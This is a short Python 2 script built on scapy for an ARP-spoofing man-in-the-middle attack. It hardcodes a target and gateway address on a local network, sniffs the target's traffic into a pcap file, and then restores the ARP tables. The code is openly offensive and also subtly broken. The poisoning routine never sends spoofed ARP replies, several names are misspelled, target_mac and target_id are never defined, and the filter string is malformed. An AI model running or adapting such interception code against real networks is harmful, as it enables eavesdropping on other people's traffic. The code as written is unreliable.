from scapy.all import *
import os 
import sys
import threading
import signal

interface = 'enl'
target_ip = '172.16.1.71'
gateway_ip = '172.16.1.254'
packet_count = 1000


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    #slightly different method using send
    print '[*] Restoring target...'
    send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,
             hwdst='ff:ff:ff:ff:ff:ff',
             hwscr=gateway_mac),count=5)
    send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,
             hwdst='ff:ff:ff:ff:ff:ff',
             hwsrc=target_mac),count=5)
    os.kill(os.getpid(), signal.SIGINT)

    
def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address),
                                timeout=2,retry=10)
    #return the mac address for a response
    for s,r in responses:
        return r[Ether].src
    return None


def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):                              
    try:
        print '[*] Starting sniffer for %d packets' % packet_count
    
        bpf_filter ='ip host is %s' % target_ip
        packets = sniff(count=packet_count,
                    filter=bpf_filter,
                    iface=interface)
        #write out captured packets
        wrpcap('arper.pcap', packets)
    
        #restore the network
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    
    except KeyboardInterrupt:
        #restore the network
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
        sys.exit(0)
    
if __name__ == '__main__':
    #set our interface
    conf.iface = interface

    #turn off output
    conf.verb = 0

    print '[*] Setting up %s' % interface

    gateway_mac = get_mac(gateway_ip)

    if gateway_mac is None:
        print '[!!!] Failed to get gateway MAC. Exiting.'
        sys.exit(0)
    else:
        print '[*] Gateway is %s is at %s' % (target_ip, target_mac)

    #start poison thread
    poison_thread = threading.Thread(target=poison_target, 
                                 args =(gateway_ip, 
                                        gateway_mac,
                                        target_id, 
                                        target_mac))
    poison_thread.start()
